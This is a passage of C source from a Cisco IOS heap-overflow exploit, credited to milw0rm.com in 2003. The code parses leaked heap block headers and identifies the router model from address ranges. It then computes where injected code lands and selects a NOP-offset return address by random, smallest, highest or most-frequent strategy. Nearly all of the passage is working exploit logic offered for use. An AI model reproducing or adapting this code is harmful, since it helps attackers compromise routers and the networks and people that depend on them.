printf("\tNEXT Block : %08X\n",p_next);
if (block2_next_field==NULL) {
if (cfg.verbose) printf("Assigning as block2_next_field\n");
block2_next_field=p;
} else if (block3_next_val==0) {
if (cfg.verbose) printf("Assigning as block3_next_val\n");
block3_next_val=p_next;
}
state++;
p+=4;
break;

case ST_PREV:
p_prev=ntohl(*(unsigned int *)p);
if (cfg.verbose)
printf("\tPREV Block : %08X\n",p_prev);
state++;
p+=4;
break;

case ST_SIZE:
if (cfg.verbose)
printf("\tBlock Size : %8u words",
ntohl(*(unsigned int *)p)&0x7FFFFFFF);
if (ntohl(*(unsigned int *)p)&0x80000000) {
if (cfg.verbose)
printf(" (Block in use)\n");
} else {
if (cfg.verbose)
printf(" (Block NOT in use)\n");
}
state++;
p+=4;
break;

case ST_REF:
if (cfg.verbose)
printf("\tReferences : %8u\n",ntohl(*(unsigned int *)p));
state++;
p+=4;
break;

case ST_LASTDE:
if (cfg.verbose)
printf("\tLast DeAlc : %08X\n",ntohl(*(unsigned int *)p));
state=ST_ID_ME_NOW;
p+=4;
break;

//
// Identification 
//
case ST_ID_ME_NOW:

i=0;
while ((leak.guess==-1)&&(cisco_boxes[i].name!=NULL)) {
if (
(p_name>=cisco_boxes[i].PC_start) && 
(p_name<=cisco_boxes[i].PC_end) &&
(p_pc>=cisco_boxes[i].PC_start) && 
(p_pc<=cisco_boxes[i].PC_end) &&
(p_next>=cisco_boxes[i].IO_start) && 
(p_next<=cisco_boxes[i].IO_end) &&
(p_prev>=cisco_boxes[i].IO_start) && 
(p_prev<=cisco_boxes[i].IO_end)
) {
leak.guess=i;
break;
}
i++;
}
state=0;
p+=4;
break;

default:
p+=1;

}
}

if ( (opcode_begin!=NULL) && (block2_next_field!=NULL) && (block3_next_val!=0) ) {
unsigned int delta;
unsigned int a;
unsigned int i;
int flag=0;

delta=(unsigned int)((void*)block2_next_field - (void*)opcode_begin);
a=block3_next_val-delta;

if (cfg.verbose) {
printf("\n");
printf("Delta between opcode_begin (%p) "
"and block2_next_field (%p) is %u\n",
(void*)block2_next_field, (void*)opcode_begin, delta);
printf("The third block is at 0x%08X\n", block3_next_val);
printf("Therefore, the code should be located at 0x%08X\n",a);
}

for (i=0;i<leak.addrc;i++) {
if (leak.addrs[i].a==a) {
leak.addrs[i].count++;
flag++;
break;
}
}
if ((flag==0)&&(leak.addrc<MAXADDRS-1)) {
leak.addrs[leak.addrc++].a=a;
leak.addrs[leak.addrc].count=1;
leak.lastaddr=a;
}
}
}


unsigned int SelectAddress(void) {
unsigned int the_address;
int rnd_addr;
unsigned int i,j;
addrs_t atmp;
addrs_t consider[MAXADDRS];
unsigned int consc=0;

if (leak.addrc==0) {
fprintf(stderr,"ERROR: No addresses available. Unable to recover\n");
return 0;
}
for (i=0;i<leak.addrc;i++) 
printf(" Address 0x%08X (%u times)\n",
leak.addrs[i].a,
leak.addrs[i].count);

//
// put addresses to consider in another array.
// We only want those above our threshold, to prevent irregular buffers
//
memset(&consider,0,sizeof(consider));
for (i=0;i<leak.addrc;i++) {
if (leak.addrs[i].count<LOW_COUNT_THR) {
printf("Address 0x%08X count below threshold\n",
leak.addrs[i].a);
continue;
}
consider[consc]=leak.addrs[i];
consc++;
}

//
// bubble sort addresses, unless we are operating count based, where we 
// sort by times of appearences
//
if (cfg.strategy != S_FREQUENT) {
for (i=0;i<consc-1;i++) {
for (j=0;j<(consc-1-i);j++) {
if (consider[j+1].a < consider[j].a) {
atmp=consider[j];
consider[j] = consider[j+1];
consider[j+1] = atmp;
}
}
}
} else {
for (i=0;i<consc-1;i++) {
for (j=0;j<(consc-1-i);j++) {
if (consider[j+1].count < consider[j].count) {
atmp=consider[j];
consider[j] = consider[j+1];
consider[j+1] = atmp;
}
}
}
}

printf("Cleaned up, remaining addresses %u\n",consc);
if (consc==0) {
fprintf(stderr,"ERROR: No addresses left. Unable to recover\n"
"You can try to decrease LOW_COUNT_THR in the source\n");
return 0;
}
for (i=0;i<consc;i++) 
printf(" Address 0x%08X (%u times)\n",
consider[i].a,
consider[i].count);



switch (cfg.strategy) {
case S_RANDOM: 
{
srand((unsigned long)time(NULL));
rnd_addr=(int)(((float)consc-1)*rand()/(RAND_MAX+1.0));
the_address=consider[rnd_addr].a + leak.nop_offset;
printf("Use pseudo-randomly selected address 0x%08X (0x%08X)\n",
the_address,consider[rnd_addr].a);
}
break;
case S_LAST: 
{
the_address=leak.lastaddr + leak.nop_offset;
printf("Using last address 0x%08X\n",the_address);
}
break;
case S_SMALLEST:
{
if (consc==1) {
the_address= consider[0].a + leak.nop_offset;
printf("Using smallest address 0x%08X (0x%08X)\n",
the_address,consider[0].a);
} else if (consc==2) {
the_address= consider[1].a + leak.nop_offset;
printf("Using second smallest address 0x%08X (0x%08X)\n",
the_address,consider[1].a);
} else {
the_address= consider[2].a + leak.nop_offset;
printf("Using third smallest address 0x%08X (0x%08X)\n",
the_address,consider[2].a);
}
}
break;
case S_HIGHEST:
{
the_address= consider[consc-1].a + leak.nop_offset;
printf("Using highest address 0x%08X (0x%08X)\n",
the_address,consider[consc-1].a);
}
break;
case S_FREQUENT:
{
// already sorted by frequency
the_address= consider[consc-1].a + leak.nop_offset;
printf("Using most frequent address 0x%08X (0x%08X)\n",
the_address,consider[consc-1].a);
}
break;
default:
fprintf(stderr,"ERROR: unknown address strategy selected\n");
return (0);
}

return the_address;
}

// milw0rm.com [2003-08-10]
